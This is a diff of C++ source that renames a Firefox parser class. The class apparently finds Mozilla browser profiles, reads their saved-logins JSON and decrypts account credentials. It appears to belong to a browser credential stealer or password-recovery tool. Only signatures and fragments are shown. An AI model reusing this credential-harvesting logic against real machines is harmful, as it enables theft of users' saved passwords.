@@ -1,4 +1,4 @@
-﻿#include "firefox_parser.h"
+﻿#include "FireFoxParser.h"
 
 #include <iostream>
 #include <json.hpp>
@@ -7,7 +7,7 @@
 #include "FirefoxDecryptor.h"
 #include "RegEditHelper.h"
 
-firefox_parser::firefox_parser()
+FireFoxParser::FireFoxParser()
 {
 
 }
@@ -15,7 +15,7 @@ firefox_parser::firefox_parser()
 
 
 
-List<AccountData> firefox_parser::collect_data()
+List<AccountData> FireFoxParser::collect_data()
 {
 	auto browsers = this->get_mozilla_browsers();
 
@@ -60,7 +60,7 @@ List<AccountData> firefox_parser::collect_data()
 	return m_account_data;
 }
 
-List<String> firefox_parser::get_mozilla_browsers()
+List<String> FireFoxParser::get_mozilla_browsers()
 {
 	const auto m_path_local_data = IO::get_app_folder(CSIDL_APPDATA);
 
@@ -76,7 +76,7 @@ List<String> firefox_parser::get_mozilla_browsers()
 	return std::move(foundBrowsers);
 }
 
-String firefox_parser::get_profile_dir(const String& dir_localdata)
+String FireFoxParser::get_profile_dir(const String& dir_localdata)
 {
 	try
 	{		
@@ -109,7 +109,7 @@ String firefox_parser::get_profile_dir(const String& dir_localdata)
 	return "";
 }
 
-String firefox_parser::get_mozilla_program_dir(const String& temp_dir)
+String FireFoxParser::get_mozilla_program_dir(const String& temp_dir)
 {
 	const String path_to_ini_file = temp_dir + "\\compatibility.ini";
 	
@@ -127,7 +127,7 @@ String firefox_parser::get_mozilla_program_dir(const String& temp_dir)
 	return "";
 }
 
-List<AccountData> firefox_parser::get_encrypted_data(const String& path_to_json)
+List<AccountData> FireFoxParser::get_encrypted_data(const String& path_to_json)
 {
 	String data_logins;
 	List<AccountData> accounts_data;
@@ -158,7 +158,7 @@ List<AccountData> firefox_parser::get_encrypted_data(const String& path_to_json)
 	return accounts_data;
 }
 
-bool firefox_parser::prepare_imports(String profile_dir, String& out_temp_dir)
+bool FireFoxParser::prepare_imports(String profile_dir, String& out_temp_dir)
 {
 	String profile_name;
 	
